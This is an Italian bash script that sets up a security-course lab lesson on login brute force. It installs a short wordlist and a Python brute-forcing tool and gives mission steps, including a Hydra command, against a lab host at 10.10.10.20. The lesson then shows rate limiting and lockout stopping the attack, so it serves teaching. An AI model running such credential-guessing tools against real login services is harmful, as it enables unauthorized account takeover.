#!/usr/bin/env bash
# Lezione 16 · lato Kali · brute force del login + il tool bruteforce.py.
# Installa lo strumento e una wordlist in ~/lab/lezione-16/. Idempotente.
set -uo pipefail

TARGET_IP="10.10.10.20"
UTENTE="${SUDO_USER:-$USER}"
HOME_UTENTE="$(getent passwd "$UTENTE" | cut -d: -f6)"
[ -z "$HOME_UTENTE" ] && HOME_UTENTE="/home/$UTENTE"
DIR="$HOME_UTENTE/lab/lezione-16"

echo "== Lezione 16 · Brute force del login e la sua difesa =="
mkdir -p "$DIR"

# Wordlist piccola (contiene la password giusta tra i distrattori)
cat > "$DIR/passwords.txt" <<'EOF'
123456
password
qwerty
estate
inverno
autunno
primavera
juventus
amministratore
letmein
sara2020
banca123
EOF

# Lo strumento della lezione: brute forcer in Python (solo stdlib)
cat > "$DIR/bruteforce.py" <<'PY'
#!/usr/bin/env python3
# bruteforce.py - prova ogni password di una lista contro un login HTTP.
# Uso:  python3 bruteforce.py <url> <utente> <wordlist>
#   es:  python3 bruteforce.py http://10.10.10.20:8095/debole sara.verdi passwords.txt
import sys, urllib.request, urllib.parse

url = sys.argv[1] if len(sys.argv) > 1 else "http://10.10.10.20:8095/debole"
utente = sys.argv[2] if len(sys.argv) > 2 else "sara.verdi"
lista = sys.argv[3] if len(sys.argv) > 3 else "passwords.txt"

for pw in open(lista):
    pw = pw.strip()
    if not pw:
        continue
    dati = urllib.parse.urlencode({"utente": utente, "password": pw}).encode()
    try:
        r = urllib.request.urlopen(url, data=dati, timeout=3)
        corpo = r.read().decode("utf-8", "replace")
        code = r.getcode()
    except urllib.error.HTTPError as e:
        corpo = e.read().decode("utf-8", "replace"); code = e.code
    except Exception as e:
        print("errore su %s: %s" % (pw, e)); continue
    print("provo %-15s -> %s" % (pw, code))
    if "accesso riuscito" in corpo.lower():
        print("\n[TROVATA] %s : %s" % (utente, pw))
        print(corpo)
        break
    if "troppi tentativi" in corpo.lower():
        print("\n[BLOCCATO] la difesa ha fermato il brute force.")
        print(corpo)
        break
PY
chmod +x "$DIR/bruteforce.py"
chown -R "$UTENTE:$UTENTE" "$HOME_UTENTE/lab" 2>/dev/null || true

echo
if curl -s -o /dev/null -m 4 "http://${TARGET_IP}:8095/"; then
  echo "[OK] Servizio di login raggiungibile su :8095."
else
  echo "[--] Non risponde: sul bersaglio lancia  lab 16 ."
fi

cat <<'MSG'

------------------------------------------------------------
 MISSIONE · Indovinare la password provandole tutte
------------------------------------------------------------
 Cartella:  ~/lab/lezione-16

 [ ] 1  Forza il login DEBOLE con il tuo tool                  (+45)
        cd ~/lab/lezione-16
        cat bruteforce.py            # leggi come funziona
        python3 bruteforce.py http://10.10.10.20:8095/debole sara.verdi passwords.txt
        # in alternativa, con hydra:
        # hydra -l sara.verdi -P passwords.txt 10.10.10.20 -s 8095 \
        #   http-post-form "/debole:utente=^USER^&password=^PASS^:Credenziali errate"

 [ ] 2  Prova a forzare il login FORTE: la difesa ti ferma     (+25)
        python3 bruteforce.py http://10.10.10.20:8095/forte sara.verdi passwords.txt
        # dopo pochi tentativi arriva il blocco (e la flag della difesa)

 Concetti:  dizionario  rate limiting  lockout  password robuste
------------------------------------------------------------
MSG
